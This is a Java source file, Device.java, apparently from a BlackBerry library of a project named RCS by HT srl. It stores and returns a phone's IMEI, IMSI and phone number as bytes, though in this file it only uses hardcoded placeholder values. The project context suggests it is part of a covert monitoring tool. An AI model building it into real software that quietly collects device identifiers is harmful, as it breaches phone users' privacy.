/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Device.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import com.ht.rcs.blackberry.interfaces.Singleton;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.rcs.blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class Device.
 */
public class Device implements Singleton {

    /** The debug. */
    private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);

    
    public final static long Version = 20104010932L;
    public final static String SubType = "BB";
    

    
    /** The imei. */
    String imei = "";

    /** The imsi. */
    String imsi = "";

    /** The phone number. */
    String phoneNumber = "";

    /** The instance. */
    private static Device instance = null;

    /**
     * Gets the single instance of Device.
     * 
     * @return single instance of Device
     */
    public synchronized static Device getInstance() {
        if (instance == null)
            instance = new Device();

        return instance;
    }

    /**
     * Instantiates a new device.
     */
    private Device() {
    }

    /**
     * Refresh data.
     */
    public void refreshData() {
        imsi = "123456789012345";
        imei = "123456789012345";
        phoneNumber = "+39 02 12345678";

    }

    /**
     * Gets the imei.
     * 
     * @return the imei
     */
    public byte[] getImei() {

        Check.ensures(imei != null, "null imei");
        byte[] encoded = WChar.getBytes(imei);
        return encoded;
    }

    /**
     * Gets the imsi.
     * 
     * @return the imsi
     */
    public byte[] getImsi() {
        Check.ensures(imsi != null, "null imsi");
        byte[] encoded = WChar.getBytes(imsi);
        return encoded;
    }

    /**
     * Gets the phone number.
     * 
     * @return the phone number
     */
    public byte[] getPhoneNumber() {
        Check.ensures(phoneNumber != null, "null phoneNumber");
        byte[] encoded = WChar.getBytes(phoneNumber);
        return encoded;
    }

	public static byte[] getVersion() {
		return Utils.longToByteArray(Version);
	}

	public static byte[] getSubtype() {
		
		return SubType.getBytes();
	}

}
